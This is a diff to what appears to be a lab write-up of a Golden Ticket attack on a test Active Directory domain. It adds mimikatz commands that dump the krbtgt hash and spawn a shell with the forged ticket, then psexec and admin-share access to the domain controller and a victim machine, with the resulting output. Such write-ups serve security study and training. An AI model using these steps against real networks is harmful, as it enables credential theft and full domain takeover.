@@ -134,7 +134,7 @@ SID               : S-1-5-21-2745015721-426968701-4006811760-500
 Got the Administrator NTLM hash sitting right in memory. No cracking needed — I can use this directly for Pass the Hash.
 
 <p align="center">
-  <img src="/writeups/golden ticket/images/Screenshot_4.png" width="600">
+  <img src="/writeups/golden ticket/images/step3.png" width="600">
 </p>
 
 ## Step - 4 Dumping krbtgt Hash
@@ -153,6 +153,10 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
 
 Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.
+
+<p align="center">
+  <img src="/writeups/golden ticket/images/step4.png" width="600">
+</p>
 
 ## Step - 5 Generating and Injecting the Golden Ticket
 
@@ -200,3 +204,65 @@ Lifetime  : 6/6/2026 9:15:09 PM ; 6/3/2036 9:15:09 PM ; 6/3/2036 9:15:09 PM
 
 Golden ticket for 'Administrator @ readteambd.local' successfully submitted for current session
 ```
+
+<p align="center">
+  <img src="/writeups/golden ticket/images/step5.png" width="600">
+</p>
+
+## Step - 6 Opening a CMD Shell with the Golden Ticket
+
+```bash
+mimikatz # misc::cmd
+```
+
+After injecting the Golden Ticket with `/ptt`, I ran `misc::cmd` to open a new CMD shell that carries the forged ticket in its session. Any command I run inside that shell will use the Golden Ticket for authentication — meaning I have full Domain Admin access across the entire domain.
+
+### What I Can Do Inside That Shell
+
+```cmd
+# Access the Domain Controller file system
+dir \\READTEAMBD-DC\C$
+
+# Get a shell on any machine in the domain
+psexec \\READTEAMBD-DC cmd.exe
+
+# List all domain machines
+net view /domain
+```
+
+## Step - 7 Accessing Victim Machine File System
+
+```cmd
+dir \\192.168.5.142\c$
+```
+
+### What This Does
+
+| Part | Description |
+|------|-------------|
+| `dir` | Lists files and folders |
+| `\\192.168.5.142` | IP address of the target victim machine |
+| `\c$` | The C drive admin share — only accessible to Domain Admins |
+
+```text
+ Volume in drive \\192.168.5.142\C$ has no label.
+ Volume Serial Number is D040-B181
+
+ Directory of \\192.168.5.142\C$
+
+06/04/2026  09:01 AM    <DIR>          inetpub
+12/07/2019  02:14 AM    <DIR>          PerfLogs
+05/31/2026  10:56 PM    <DIR>          Program Files
+05/05/2023  05:27 AM    <DIR>          Program Files (x86)
+05/30/2026  11:23 PM    <DIR>          Users
+06/06/2026  10:00 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  29,588,279,296 bytes free
+```
+<p align="center">
+  <img src="/writeups/golden ticket/images/step7.png" width="600">
+</p>
+
+### What This Proves
+
+If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.
